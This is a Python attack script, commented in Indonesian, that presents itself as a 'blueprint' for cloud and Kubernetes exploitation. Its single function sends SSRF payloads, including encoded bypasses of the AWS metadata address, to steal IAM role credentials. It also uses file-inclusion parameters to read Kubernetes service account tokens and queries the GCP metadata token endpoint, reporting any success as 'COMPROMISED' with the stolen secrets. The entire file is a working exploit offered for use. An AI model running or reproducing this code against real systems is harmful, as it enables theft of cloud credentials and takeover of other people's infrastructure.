"""
Ouroboros Code Blueprint: Cloud & Kubernetes Exploitation
=========================================================
Kategori : Cloud-Native Attacks
Tingkat  : Advanced
Teknik   : AWS SSRF metadata exfil, K8s service account token theft, S3 enum
"""

def run_exploit(target_url):
    """
    Blueprint untuk Cloud-Native exploitation via SSRF/RCE.
    Mengasumsikan telah mendapatkan RCE atau SSRF pada aplikasi yang berjalan di cloud.
    """
    import requests
    import json

    session = requests.Session()
    findings = []

    # ---- Teknik 1: AWS IMDSv1 via SSRF ----
    aws_meta_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/instance-id",
        # IPv6 bypass
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        # Decimal encoding
        "http://2852039166/latest/meta-data/",
    ]

    ssrf_params = ["url", "uri", "redirect", "proxy", "fetch", "callback", "target", "src"]

    for payload in aws_meta_payloads:
        for param in ssrf_params:
            try:
                r = session.get(target_url, params={param: payload}, timeout=5)
                if any(kw in r.text for kw in [
                    "ami-id", "instance-id", "security-credentials",
                    "AccessKeyId", "SecretAccessKey", "Token"
                ]):
                    # Coba ambil role name dan credentials
                    role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                    r_role = session.get(target_url, params={param: role_url}, timeout=5)
                    if r_role.text.strip():
                        role_name = r_role.text.strip().split('\n')[0]
                        cred_url = role_url + role_name
                        r_cred = session.get(target_url, params={param: cred_url}, timeout=5)
                        return {
                            "status": "COMPROMISED",
                            "details": f"AWS Metadata SSRF berhasil! Role: {role_name}. Credentials: {r_cred.text[:400]}"
                        }
                    return {
                        "status": "COMPROMISED",
                        "details": f"AWS Metadata SSRF berhasil via {param}={payload}. Data: {r.text[:300]}"
                    }
            except Exception:
                continue

    # ---- Teknik 2: Kubernetes Service Account Token ----
    # Ini dieksekusi jika mendapat RCE dalam pod
    k8s_paths = [
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    ]

    lfi_params = ["file", "page", "path", "include", "load", "read", "doc"]

    for path in k8s_paths:
        for param in lfi_params:
            try:
                r = session.get(target_url, params={param: path}, timeout=5)
                if "eyJ" in r.text or "default" in r.text or "kube-system" in r.text:
                    token = r.text.strip()
                    findings.append(f"K8s service account token ditemukan via LFI! Token: {token[:100]}...")
                    return {
                        "status": "COMPROMISED",
                        "details": f"K8s Token Theft berhasil! Path: {path}. Token (awal): {token[:100]}"
                    }
            except Exception:
                continue

    # ---- Teknik 3: GCP Metadata ----
    gcp_meta = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    for param in ssrf_params:
        try:
            r = session.get(target_url,
                           params={param: gcp_meta},
                           headers={"Metadata-Flavor": "Google"},
                           timeout=5)
            if "access_token" in r.text:
                return {
                    "status": "COMPROMISED",
                    "details": f"GCP Metadata SSRF berhasil! Token: {r.text[:300]}"
                }
        except Exception:
            continue

    if findings:
        return {"status": "COMPROMISED", "details": "; ".join(findings)}
    return {"status": "FAILED", "details": "Tidak ada cloud metadata yang berhasil dieksfiltrasi."}
